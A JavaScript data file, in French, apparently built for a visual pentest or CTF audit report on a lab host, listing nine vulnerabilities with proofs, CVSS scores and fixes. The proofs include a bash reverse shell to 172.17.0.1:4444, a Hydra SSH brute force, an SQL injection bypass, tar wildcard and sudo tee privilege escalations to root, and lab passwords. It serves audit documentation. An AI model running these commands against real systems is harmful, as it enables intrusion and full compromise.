export const vulnerabilities = [
  {
    id: "vuln-01",
    label: "Vuln 01",
    title: "Command Injection",
    severity: "Critique",
    status: "Confirmée",
    service: "PINGOZAURUS · HTTP",
    obtainedUser: "www-data",
    description:
      "L’application web PINGOZAURUS construit directement une commande ping à partir de la saisie utilisateur avec exec(), sans validation ni échappement. Un séparateur shell permet donc d’injecter et d’exécuter une commande système arbitraire.",
    proof:
      'curl -X POST http://10.10.10.83/ --data-urlencode "command=localhost -c 1;id"\n# Résultat : uid=33(www-data)',
    impact:
      "Exécution de commandes arbitraires sur le serveur et obtention d’un shell avec les privilèges de www-data.",
    recommendations: [
      "Utiliser spawn() ou execFile() à la place de exec().",
      "Passer les arguments sous forme de tableau.",
      "Valider strictement les entrées utilisateur.",
      "Ne jamais construire une commande shell par concaténation.",
    ],
    cvss: { AV: "N", AC: "L", Au: "N", C: "P", I: "P", A: "P" },
    color: "#56d58a",
    path: "M 540 650 C 485 624, 342 565, 226 489",
    labelPosition: { x: 365, y: 570 },
  },
  {
    id: "vuln-02",
    label: "Vuln 02",
    title: "Attaque par dictionnaire SSH",
    severity: "À confirmer",
    status: "Non confirmée",
    service: "SSH",
    obtainedUser: "John · validation en attente",
    description:
      "Le chemin alternatif vers John peut correspondre à une attaque par dictionnaire contre SSH. Le mot de passe peterpan étant présent dans rockyou.txt, Hydra doit pouvoir l’identifier. La vulnérabilité restera non confirmée jusqu’à l’observation d’un résultat positif et la validation d’une connexion SSH.",
    proof:
      `Étape 1 — Lancer l’attaque par dictionnaire
hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.83 -t 4 -I

Résultat attendu
[22][ssh] host: 10.10.10.83   login: john   password: peterpan

Étape 2 — Valider les identifiants découverts
ssh john@10.10.10.83
# Mot de passe : peterpan

Étape 3 — Confirmer l’identité obtenue
whoami
id
# La vulnérabilité sera confirmée si la session John est ouverte`,
    impact:
      "Si le test réussit, un attaquant peut compromettre directement John depuis le réseau puis exploiter VULN-06 pour élever ses privilèges jusqu’à Root.",
    recommendations: [
      "Utiliser un mot de passe long, unique et absent des dictionnaires publics.",
      "Privilégier l’authentification SSH par clé et désactiver les mots de passe.",
      "Limiter les tentatives avec Fail2ban ou un mécanisme équivalent.",
      "Conserver le statut non confirmé tant que le test n’est pas reproduit.",
    ],
    cvss: {
      AV: "N",
      AC: "L",
      Au: "N",
      C: "P",
      I: "P",
      A: "N",
      provisional: true,
    },
    color: "#f05263",
    path: "M 553 650 C 535 608, 505 548, 490 489",
    labelPosition: { x: 517, y: 568 },
  },
  {
    id: "vuln-03",
    label: "Vuln 03",
    title: "FTP anonyme exposant une clé privée SSH",
    severity: "Critique",
    status: "Confirmée",
    service: "FTP anonyme · SSH",
    obtainedUser: "Alice",
    description:
      "Le serveur FTP autorise une authentification anonyme et expose une clé privée SSH appartenant au compte Alice. Cette clé permet d’ouvrir une session SSH complète avec son identité.",
    proof:
      "ftp anonymous@10.10.10.83\n# Télécharger id_rsa\nchmod 600 id_rsa\nssh -i id_rsa alice@10.10.10.83",
    impact:
      "Compromission complète du compte Alice et accès interactif au serveur via SSH.",
    recommendations: [
      "Désactiver l’accès FTP anonyme.",
      "Ne jamais stocker de clés privées sur un service publiquement accessible.",
      "Restreindre les permissions des fichiers sensibles.",
    ],
    cvss: { AV: "N", AC: "L", Au: "N", C: "P", I: "P", A: "P" },
    color: "#f6a83b",
    path: "M 574 650 C 638 600, 700 548, 750 489",
    labelPosition: { x: 662, y: 568 },
  },
  {
    id: "vuln-04",
    label: "Vuln 04",
    title: "Injection SQL",
    severity: "Critique",
    status: "Confirmée",
    service: "EvilCorp Web · HTTP 8081",
    obtainedUser: "Bob",
    description:
      "Le formulaire /login construit sa requête SQL par concaténation. Une condition toujours vraie injectée dans username contourne l’authentification et ouvre le panneau d’administration, où une note interne divulgue le mot de passe de Bob.",
    proof:
      `Étape 1 — Vérifier le mécanisme d’authentification
curl -X POST http://10.10.10.83:8081/login \\
  -d "username=test&password=test"
# Résultat : Invalid credentials

Étape 2 — Injecter une condition SQL toujours vraie
curl -X POST http://10.10.10.83:8081/login \\
  --data-urlencode "username=' OR 1=1 -- " \\
  --data-urlencode "password=test"

# Requête résultante
SELECT * FROM users WHERE username='' OR 1=1 -- ' AND password='test'

Étape 3 — Accéder au panneau d’administration
# Authentification contournée
# Mot de passe divulgué : Bob / xNfE98RSsa

Étape 4 — Ouvrir une session SSH
ssh bob@10.10.10.83
# Mot de passe : xNfE98RSsa

Étape 5 — Confirmer l’identité obtenue
whoami
id
# Shell interactif sous l’identité de Bob`,
    impact:
      "Contournement complet de l’authentification, exposition d’informations confidentielles et compromission du compte Bob, ouvrant la voie à l’élévation Root via VULN-08.",
    recommendations: [
      "Utiliser exclusivement des requêtes préparées ou un ORM sûr.",
      "Valider et filtrer toutes les entrées côté serveur.",
      "Limiter les privilèges du compte de base de données.",
      "Ne jamais afficher de mots de passe ou d’identifiants sensibles dans l’interface.",
    ],
    cvss: { AV: "N", AC: "L", Au: "N", C: "P", I: "P", A: "N" },
    color: "#5581ff",
    path: "M 589 650 C 705 610, 912 545, 1014 489",
    labelPosition: { x: 810, y: 570 },
  },
  {
    id: "vuln-05",
    label: "Vuln 05",
    title: "Divulgation d’identifiants",
    severity: "Élevée",
    status: "Confirmée",
    service: "Système de fichiers · SSH",
    obtainedUser: "John",
    description:
      "Après l’exploitation de la Command Injection sur PINGOZAURUS, un reverse shell est obtenu avec les privilèges de www-data. L’énumération du système permet ensuite d’identifier le fichier /run/john-script.sh, dont le contenu divulgue en clair le mot de passe du compte John.",
    proof:
      `Étape 1 — Démarrer le listener Netcat
nc -lvnp 4444

Étape 2 — Injecter le payload de reverse shell
curl -X POST http://10.10.10.83/ \\
  --data-urlencode "command=localhost -c 1; /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'"

Étape 3 — Confirmer le contexte d’exécution
whoami
id
pwd
# Shell obtenu avec les privilèges de www-data

Étape 4 — Énumérer les scripts et fichiers accessibles
find / -name "*.sh" 2>/dev/null
find / -type f 2>/dev/null

Étape 5 — Lire le script découvert
cat /run/john-script.sh

Résultat
PASSWD="peterpan"

Étape 6 — Ouvrir une session SSH avec le mot de passe découvert
ssh john@10.10.10.83
# Mot de passe : peterpan`,
    impact:
      "Divulgation d’un secret réutilisable permettant la compromission du compte John, étape préalable à l’élévation de privilèges via VULN-06.",
    recommendations: [
      "Stocker les secrets dans un gestionnaire dédié.",
      "Utiliser des variables d’environnement sécurisées.",
      "Ne jamais conserver de mots de passe en clair dans des scripts.",
    ],
    cvss: { AV: "N", AC: "L", Au: "S", C: "P", I: "P", A: "N" },
    color: "#f4b23f",
    path: "M 222 390 L 222 350 Q 222 332 240 332 L 466 332 Q 485 332 485 350 L 485 365",
    labelPosition: { x: 325, y: 334 },
  },
  {
    id: "vuln-06",
    label: "Vuln 06",
    title: "Tar Wildcard Injection",
    severity: "Critique",
    status: "Confirmée",
    service: "Tâche cron · tar",
    obtainedUser: "Root",
    description:
      "Depuis le compte John, l’analyse de /etc/crontab révèle une sauvegarde exécutée par Root toutes les cinq minutes avec tar et le caractère *. Comme aucun -- ne sépare les options des fichiers, des noms commençant par -- sont interprétés comme des arguments GNU tar. Deux faux fichiers checkpoint permettent ainsi de faire exécuter un script arbitraire par la tâche cron avec les privilèges Root.",
    proof:
      `Étape 1 — Énumérer le compte John
whoami
id
pwd
ls -la
sudo -l
cat /etc/crontab

# Tâche exécutée par Root toutes les 5 minutes
cd /home/john/ && tar -zcf /home-john-backup.tgz *

Étape 2 — Préparer le payload SUID
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > shell.sh
chmod +x shell.sh

Étape 3 — Créer les fausses options GNU tar
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

Étape 4 — Attendre et contrôler l’exécution du cron
ls -l --full-time /home-john-backup.tgz
ls -l /tmp/rootbash
# Résultat attendu : -rwsr-xr-x root root /tmp/rootbash

Étape 5 — Obtenir et vérifier le shell Root
/tmp/rootbash -p
whoami
id
# Résultat : root, avec un UID effectif égal à 0`,
    impact:
      "Exécution de commandes arbitraires par la tâche cron et élévation complète des privilèges depuis John jusqu’à Root, avec accès à l’ensemble des fichiers et secrets du système.",
    recommendations: [
      "Ne pas utiliser de caractères génériques dans une tâche cron privilégiée.",
      "Insérer -- avant la liste des fichiers : tar -zcf archive.tar -- *.",
      "Référencer explicitement les fichiers à sauvegarder.",
      "Exécuter la sauvegarde avec un compte dédié disposant du minimum de privilèges.",
    ],
    cvss: { AV: "N", AC: "L", Au: "S", C: "C", I: "C", A: "C" },
    color: "#aa87e8",
    path: "M 488 390 L 488 295 Q 488 278 505 278 L 586 278 Q 605 278 605 260 L 605 193",
    labelPosition: { x: 530, y: 294 },
  },
  {
    id: "vuln-07",
    label: "Vuln 07",
    title: "Mauvaise configuration sudo",
    severity: "Critique",
    status: "Confirmée",
    service: "sudo · tee",
    obtainedUser: "Root",
    description:
      "Le compte Alice possède une règle sudo lui permettant d’exécuter tee sans mot de passe. Cette commande autorise l’écriture dans des fichiers système sensibles et permet d’obtenir les privilèges Root.",
    proof:
      `Étape 1 — Découverte (depuis le shell Alice)
sudo -l
# → (ALL : ALL) NOPASSWD: /usr/bin/tee -a *

Étape 2 — Exploitation
echo "alice ALL=(ALL) NOPASSWD: ALL" | sudo /usr/bin/tee -a /etc/sudoers

Étape 3 — Devenir Root
sudo su

Résultat
root@bf818c9b1d85:~# id
uid=0(root) gid=0(root) groups=0(root)`,
    impact:
      "Modification arbitraire de fichiers système et élévation complète des privilèges vers Root.",
    recommendations: [
      "Supprimer la règle sudo associée à tee.",
      "Limiter strictement les commandes autorisées.",
      "Appliquer le principe du moindre privilège.",
    ],
    cvss: { AV: "N", AC: "L", Au: "S", C: "C", I: "C", A: "C" },
    color: "#b591e8",
    path: "M 752 390 L 752 350 Q 752 332 734 332 L 624 332 Q 605 332 605 314 L 605 193",
    labelPosition: { x: 674, y: 334 },
  },
  {
    id: "vuln-08",
    label: "Vuln 08",
    title: "Binaire SUID dangereux",
    severity: "Critique",
    status: "Confirmée",
    service: "Binaire SUID · find",
    obtainedUser: "Root",
    description:
      "Après l’obtention d’un shell SSH sous l’identité de Bob via VULN-04, une énumération locale des fichiers SUID révèle une copie anormale du binaire find dans /home/bob/find. Ce fichier appartient à Root et possède le bit SUID : lorsqu’il est exécuté par Bob, il conserve donc l’identité effective de son propriétaire. La fonctionnalité légitime -exec de find permet de lancer une commande externe ; elle est détournée pour exécuter /bin/sh, tandis que l’option -p empêche le shell d’abandonner les privilèges hérités. L’attaquant obtient ainsi immédiatement un shell dont l’identité effective est Root, sans mot de passe ni exploitation supplémentaire.",
    proof:
      `Étape 1 — Confirmer le compte compromis
whoami
id
# Utilisateur courant : Bob

Étape 2 — Rechercher les fichiers possédant le bit SUID
find / -perm -4000 -type f 2>/dev/null
# Résultat notable : /home/bob/find

Étape 3 — Vérifier le propriétaire et les permissions
ls -l /home/bob/find
file /home/bob/find
# Le propriétaire est Root et le mode inclut le bit SUID (s)

Étape 4 — Exploiter la fonctionnalité -exec de find
/home/bob/find . -exec /bin/sh -p \\; -quit
# -exec lance un shell
# -p conserve les privilèges effectifs hérités du binaire SUID

Étape 5 — Vérifier l’élévation de privilèges
whoami
id
# Résultat : identité effective Root, euid=0(root)

Résultat final
Un shell Root interactif est obtenu depuis le compte Bob.`,
    impact:
      "Élévation locale immédiate et complète depuis Bob vers Root. L’attaquant peut lire ou modifier tous les fichiers, récupérer les secrets du système, altérer sa configuration, créer des comptes privilégiés, installer une persistance et compromettre intégralement la machine.",
    recommendations: [
      "Supprimer immédiatement le bit SUID avec chmod u-s /home/bob/find.",
      "Supprimer cette copie locale et utiliser uniquement le binaire système officiel.",
      "Rechercher et auditer régulièrement tous les fichiers SUID avec find / -perm -4000 -type f.",
      "Contrôler les propriétaires, permissions et empreintes des binaires privilégiés.",
      "Appliquer le principe du moindre privilège et surveiller la création de nouveaux fichiers SUID.",
    ],
    cvss: { AV: "N", AC: "L", Au: "S", C: "C", I: "C", A: "C" },
    color: "#78bd78",
    path: "M 1016 390 L 1016 270 Q 1016 250 996 250 L 625 250 Q 605 250 605 230 L 605 193",
    labelPosition: { x: 810, y: 252 },
  },
  {
    id: "vuln-09",
    label: "Vuln 09",
    title: "Accès Root alternatif",
    severity: "À confirmer",
    status: "Non confirmée",
    service: "Non déterminé",
    obtainedUser: "Root · hypothèse du schéma",
    description:
      "Le schéma présente une voie supplémentaire permettant un accès direct au compte Root depuis la machine de l’attaquant. Aucun mécanisme d’exploitation n’a été confirmé durant l’audit.",
    proof: "Aucune preuve technique disponible.",
    impact: "Non évalué en l’absence de validation technique.",
    recommendations: [
      "Conserver ce chemin comme hypothèse tant qu’il n’est pas reproduit.",
      "Documenter une preuve reproductible avant de le déclarer exploitable.",
    ],
    cvss: null,
    color: "#ed6971",
    path: "M 141 230 L 585 166 M 141 230 L 475 366 M 141 230 L 746 366 M 141 230 L 1010 366",
    labelPosition: { x: 103, y: 232 },
    multiPath: true,
  },
];

export const users = [
  { id: "user-w", name: "User W", x: 220, y: 425 },
  { id: "user-j", name: "User J", x: 485, y: 425 },
  { id: "user-a", name: "User A", x: 750, y: 425 },
  { id: "user-b", name: "User B", x: 1015, y: 425 },
];
